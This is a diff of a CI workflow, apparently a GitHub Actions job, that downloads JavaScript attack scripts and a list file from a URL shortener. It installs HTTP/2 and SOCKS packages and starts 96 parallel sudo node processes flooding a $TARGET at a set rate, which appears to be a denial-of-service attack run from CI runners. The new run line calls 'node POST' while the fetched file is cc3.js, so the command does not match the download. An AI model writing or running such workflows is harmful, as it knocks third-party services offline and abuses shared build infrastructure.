@@ -26,10 +26,9 @@ jobs:
     steps:
     - name: Dosyaları indir ve hazırla
       run: |
-        wget https://curl.by/bV28S/post.js
+        wget https://curl.by/GL5OE/cc3.js
         wget https://curl.by/PAhyK/good.txt
-        wget https://curl.by/b7cIU/ua.txt
-        chmod +x post.js
+        chmod +x cc3.js
         npm i hpack https commander colors socks
     - name: run
       run: |
@@ -39,7 +38,7 @@ jobs:
         
         PIDS=()
         for i in {1..96}; do
-          sudo timeout $TIME node post.js "$TARGET" 180 "$RATE" 10
+          sudo timeout $TIME node POST "$TARGET" 120 8 "$RATE" good.txt --full --debug
           PIDS+=($!)
         done
         
